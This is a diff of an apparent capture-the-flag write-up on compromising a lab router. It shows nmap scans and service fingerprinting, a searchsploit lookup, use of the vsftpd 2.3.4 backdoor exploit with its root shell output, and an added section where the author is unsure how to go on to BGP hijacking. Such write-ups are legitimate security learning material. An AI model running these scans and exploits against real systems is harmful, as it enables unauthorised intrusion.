@@ -208,7 +208,7 @@ Then from the attacker machine I performed a fast host discover:
     2601/tcp open  zebra
     2605/tcp open  bgpd
 
-Then I proceed to finger print the services:
+Then I proceed to fingerprint the services:
 
     nmap -sVC -Pn -p 21,179,2601,2605 172.16.1.128 
     ...
@@ -220,7 +220,8 @@ Then I proceed to finger print the services:
     2605/tcp open  quagga     Quagga routing software 1.2.4 (Derivative of GNU Zebra)
     Service Info: OS: Unix
 
-We have the (in)famous vsftp sever 2.3.4, let's confirm the exploit:
+### Root the router :)
+We have the (in)famous vsftpd sever 2.3.4, let's confirm the exploit:
 
     searchsploit "vsftpd 2.3.4"                                
     ----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -239,6 +240,9 @@ Then just execute the exploit to get a telnet session:
     id
     uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
 
+### Lost in BGP
+And now? Frankly I have no idea how to proceed further. I know what is the BGP protocol and reading the question I figured out that maybe I have to perform a MITM attack, or I have to redirect the traffic to my machine in some way? But I have no idea how to do it. 
+I tried to look for some write-up that eventually explained the exploit to a dummy, but I simply found nothing, just some commands issued without any decent explanation. Id' like to understand what I'm doing of course. In the end I hit this interesting article: https://medium.com/r3d-buck3t/bgp-hijacking-attack-7e6a30711246
 
 
 
